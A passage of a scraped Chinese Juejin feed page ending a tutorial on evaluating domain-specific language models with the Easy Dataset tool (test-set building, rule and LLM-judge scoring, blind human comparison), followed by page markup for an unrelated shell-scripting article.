<p>进入数据集详情页，我们可以直接将当前数据集添加到评估数据集（测试集），同时，系统给原数据集打上 Eval 标签（用于后续筛选/识别）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1bd7191b4e4847873538eca6f50a2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=I5M%2FqOumePsJevUG4CjelNgzbzs%3D" alt="" loading="lazy"/></p>
<p>如果训练集太少或多样性不足，模型有时候会 “死记硬背”。我们也可以把一道现有的数据集题目自动改写生成评估集变体（比如换个问法，或者把选择题改成判断题），看看模型是不是真的理解了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9f4928ed4fd4edb9d152f49aa5321fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=R6N5K11DTLnLoc2Njz8ftdi%2Bb1M%3D" alt="" loading="lazy"/></p>
<p>点击：【生成评估集变体】可以选择要生成的题目类型和数量：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b5c66261343e592fe59438650a671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=PqxrxZdqRpQRlrFuznt%2FVK0LUU4%3D" alt="" loading="lazy"/></p>
<p>在常规的思路中，一般我们要从所有数据集中划分出一定比例（如 15%）作为测试集。</p>
<p>但是，在小规模的数据集上，如果直接划分出一定比例的测试集可能会导致原有的训练集数量和多样性不足，导致模型训练效果差。</p>
<p>如果使用 <code>Easy Dataset</code> 生成的数据集，我们可以全部用于训练集，另外一部分测试集我们可以直接在现有的数据集上生成变体，或重新从文本块提取。这样既能保证训练集的多样性不会受到损失，还能保证有足够丰富的测试集来支撑最终模型效果的评估。</p>
<h4 data-id="heading-13">导入导出测试集</h4>
<p>如果你已经有准备好的测试集，只是想使用 <code>Easy Dataset</code> 来做评估任务，可以到【评估-评估数据集】模块直接进行导入：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d4720bd8e1f49efa79e7083ab1308ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0ehA3YwrkJQbLbq9AfqSn%2F5lZDc%3D" alt="" loading="lazy"/></p>
<p>目前支持从 <code>JSON、XLS、XLSX</code> 几种类型的文件进行导入，需要将文件处理成规定格式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f3e3893fc554dfb841e3f596d8e6df0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u4oHme5Z%2F9txz78y9w9xjCy7jaU%3D" alt="" loading="lazy"/></p>
<p>你可以直接下载对应题型和文件类型的模版，然后按照模版进行补充：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae275ad3b906470f8c1d009669ebe36e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cfRU9Wjt8%2Fys8hAua367%2F9GwvpM%3D" alt="" loading="lazy"/></p>
<p>另外，平台还内置了丰富的领域知识数据集，如果你想测试模型在特定领域下的表现，可以直接选择【导入内置数据集】并选择对应学科进行导入：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32778826ddc7415c948c69d6575eaa48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mf%2FVaB8vUlPXhk2iEzwLFYTaslo%3D" alt="" loading="lazy"/></p>
<p>每个学科下都内置了几百道不同难度的题目（大部分为单选或多选题）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c96570a3a764814bbcb3e1006e6e5f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=0Bfp%2BsL2g5Qpjy%2Fqi%2FgnyK07CoE%3D" alt="" loading="lazy"/></p>
<p>测试集处理完成后，我们也可以直接进行导出（支持自定义导出范围和格式），你可用于其他评估系统：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e1d4e7954c943acb85bb527b8db94f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2IRLLCEVB1fWrD9yo2yqDAxIhn4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2. 怎么打分？（自动评估任务）</h3>
<p>题出好了，接下来就是让业务模型来做题，系统来判卷。系统支持两种阅卷模式：</p>
<h4 data-id="heading-15">模式一：直接计算得分（针对客观题）</h4>
<p>对于<strong>判断题、单选题、多选题</strong>，答案是唯一的。
系统不需要调用大模型，直接用规则代码比对。</p>
<p>我们来到【评估-自动评估任务】模块，点击创建任务，您可以同时勾选多个模型，系统会并发执行多个任务：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/418f1e4b15ad41268dca5088351da9ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=FBUHmgA%2BuhuPNmxqtBLDSfesKZE%3D" alt="" loading="lazy"/></p>
<p>就像要真实要对模型进行一场考试一样，我们可以配置本次 “考卷” 的具体题目范围：</p>
<ul>
<li><strong>题型筛选</strong>：比如本次之考察选择题和判断题。</li>
<li><strong>标签筛选</strong>：比如只考查标签为 <code>医疗知识</code> 的题目。</li>
<li><strong>动态采样</strong>：如果您想快速获得结果，可以从 1000 道题中随机抽样 50 道。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8d7497beb740cb8abd475537c55ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=u32ZtfMpZDNW0I7OBrxbQEMK%2FEU%3D" alt="任务执行中" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a68f82299141ab9ec1e4d50eec1351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=yfhUR2HJIY9Kgh70hzDlmJt792o%3D" alt="任务执行完成" loading="lazy"/></p>
<p>进入评估任务详情，你可以看到模型在不同题目上的具体得分情况，我们可以根据题目回答结果（正确/错误）以及题目类型（判断、单选、多选）进行筛选：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56629816f35b4a5ba2b001c4ebafb7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=gIGcBjTtGGN%2BVQbVvcVKjEPFdOI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">模式二：教师模型评估（针对主观题）</h4>
<p>对于客观题（选择、判断），系统可以自动对齐答案。但对于 <strong>简答题</strong> 和 <strong>开放题</strong>，答案往往是多样化的。我们可以选择一个更智慧的 “教师模型”（就像判断老师一样） 对测试模型的回答进行深度评测，给出量化的分数和定性的评语。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/312f4c8f116a4654905c19c10b0815fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=OCdaAlZ8CKyD6e7nMESfw84k%2BNM%3D" alt="" loading="lazy"/></p>
<p>系统内置了一份评分标准，不过通用的标准比较宽泛，不一定适用于所有场景，如果你想得到更准确的评估结果，建议根据实际业务场景和数据集的特点定制具体的评分规则：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b274baae7064d57a18e11eb36f81fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=QCPVvyQRBoNCkhzbr%2FA2%2Bjd6D6g%3D" alt="" loading="lazy"/></p>
<p>在评估报告详情中，你可以看到每个题目的具体得分，教师模型的打分以及具体的打分理由：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33f31315d0414e32893fa59a1c7ff815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=mKF70N1TjWPegx%2FTDVEotWOAxEI%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>建议：</p>
<ul>
<li>同一套评估长期对比时，尽量固定教师模型与评分配置，否则分数不可直接横向对比</li>
<li>先在小样本（如 20 题）跑通，确认裁判标准符合预期，再扩大规模</li>
</ul>
</blockquote>
<h3 data-id="heading-17">3. 人工盲测：回归真实直觉的 “竞技场”</h3>
<p>虽然自动化评估很方便，但在模型上线的最后阶段，或者两个模型分数咬得很死的时候，还是需要人来看一眼。</p>
<blockquote>
<p><strong>盲测任务是什么？</strong></p>
<ul>
<li>盲测任务 = 把多个模型的回答“匿名化”，让评审者只看回答质量做选择/打分</li>
<li>适合：
<ul>
<li>你希望排除“模型名偏见”</li>
<li>你更在意主观体验（可读性、风格、说服力、完整性等）</li>
<li>开放题/对话型内容的最终质量评估</li>
</ul>
</li>
</ul>
</blockquote>
<p>就像在上个章节中我们讲到到 <code>LMArena</code>，人工盲测对于垂直领域的模型评估同等重要，在实际测试中，系统会隐藏两个模型的回答结果，评判者仅根据回答的质量、逻辑、语气进行主观判断，彻底消除对特定品牌的固有偏见。</p>
<p>我们来到【评估-人工盲测任务】模块，然后点击创建任务，然后配置：</p>
<ul>
<li><strong>两两对比</strong>：从模型库中选择两个你最想对比的模型。</li>
<li><strong>题目范围</strong>：选择简答题或开放题并设置抽样数量。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a285420962c456898a224517afe4637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Ygmq4EgT76Cfelwmy0nE6bLzip4%3D" alt="" loading="lazy"/></p>
<p>任务开启后，您将进入一个类似 <strong>Chatbot Arena</strong> 的沉浸式的对比界面：</p>
<ul>
<li><strong>左右对照</strong>：左边展示候选 A 的回答，右边展示候选 B 的回答，但不告诉标注人员具体是哪个模型。</li>
<li><strong>流式加载</strong>：系统支持流式输出，您可以实时看到模型的生成过程。</li>
<li><strong>四选一投票</strong>：标注人员只需要根据直观感受，选择“左边好”、“右边好”或者“平局”。
<ul>
<li><strong>👈 左边更好</strong>：左侧回答在准确性、流畅度或安全性上更优。</li>
<li><strong>👉 右边更好</strong>：右侧回答更符合你的预期。</li>
<li><strong>🤝 平局</strong>：两者难分伯仲，或都存在明显的严重错误。</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c547fb0ce7b34e45ac5571c2f5826283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=6aBpZxSeH7kH%2Fi1vWAktb6DMMi8%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>这种 Side-by-Side 的比较数据，是目前公认最符合人类真实体感的评估方式。</p>
</blockquote>
<p>当所有题目投票完成后，系统会 “揭晓谜底” 并生成胜率统计，系统将展示每个模型在对比中获胜的百分比。如果平局较多，说明这两个模型在当前题库下的表现非常接近。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b4b6f87ce4a4acca5c93370e4df418d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=2uiIcrN1RBn6zCHf%2F5pRAChldf4%3D" alt="" loading="lazy"/></p>
<p>你还可以回顾具体某个题目的回答结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79e1b67cd96f458bbc4ed348d89b88b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=oT6dZMGZXMmUw9quD6UhvERQEwU%3D" alt="" loading="lazy"/></p>
<p>回到任务列表，我们能清晰的看到每次盲测任务的结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30fb91c3cdd6477eb1d8d691a0c16ed5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=J0vetIzt7%2BzZFpsfpWkmeqe0Lx8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">4. 高级用法：自定义评估</h3>
<p>如果你有更定制化的模型评估需求（如需要定制处理的风格和侧重点、希望教师模型更关注某些特定维度），可以到【更多-项目设置-提示词配置模型】对模型评估的提示词进行更改，系统全面开放了评估系统的全套提示词，包括：</p>
<ul>
<li>从领域文献生成测试集的提示词：判断题、单选题、多选题、简答题、开放问题的生成</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95cfa6f145294b40b075218d0cc3513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=nPwAeQdzjgV1etNYKsJIRN8JVxM%3D" alt="" loading="lazy"/></p>
<ul>
<li>不同题目执行测评的提示词：从原始题目获取答案</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99912934edb04fb7ab1319a01d33a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=P1iXgr%2BLV1X%2Bs3AHU3peCxjLaKo%3D" alt="" loading="lazy"/></p>
<ul>
<li>LLM 评估提示词：包括简答题和开放问题的评估</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6bddf44817b4e8389f0e515f631d79c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=v2J2tU1p7ju3OR7iueeVqNNzs5o%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>具体的评分细则在创建任务中是可以配置的，实际影响的就是提示词中的 <code>{{scoreAnchors}}</code> 变量，在这里的设置可以直接覆盖这个变量，自由度更高。</p>
</blockquote>
<h2 data-id="heading-19">最后</h2>
<p>希望阅读完本期教程，你将学会以下内容：</p>
<ol>
<li>理解通用基准在垂直领域的局限性，明确评估的三大核心目标（选型验证、微调效果、RAG优化）</li>
<li>掌握三类垂直领域评估方法的适用场景（确定性评估、文本相似度评估、LLM as Judge）</li>
<li>学会多方式构建垂直领域评估测试集（文献提取、训练集转化、自定义导入）</li>
<li>掌握客观题规则判分、主观题教师模型打分的自动化评估方法</li>
<li>能设计并执行人工盲测任务，获取贴合实际体感的模型对比结果</li>
<li>可通过自定义提示词适配不同垂直领域的评估需求</li>
<li>建立“测试集构建—自动化评估—人工验证”的评估闭环，实现模型效果量化判断</li>
</ol>
<p>关注《code秘密花园》从此学习 AI 不迷路，相关链接：</p>
<ul>
<li>Easy Dataset：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset" target="_blank" title="https://github.com/ConardLi/easy-dataset" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
<li>AI 教程完整汇总：<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwR…</a></li>
<li>相关学习资源汇总在：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
</ul>
<p>如果本期对你有所帮助，希望得到一个免费的三连，感谢大家支持</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shell入门指南]]></title>    <link>https://juejin.cn/post/7594661351514259491</link>    <guid>https://juejin.cn/post/7594661351514259491</guid>    <pubDate>2026-01-14T01:42:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594661351514259491" data-draft-id="7594667893017034767" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shell入门指南"/> <meta itemprop="keywords" content="全栈,自动化运维"/> <meta itemprop="datePublished" content="2026-01-14T01:42:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lihouyi"/> <meta itemprop="url" content="https://juejin.cn/user/4365493763322599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shell入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4365493763322599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lihouyi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T01:42:29.000Z" title="Wed Jan 14 2026 01:42:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body 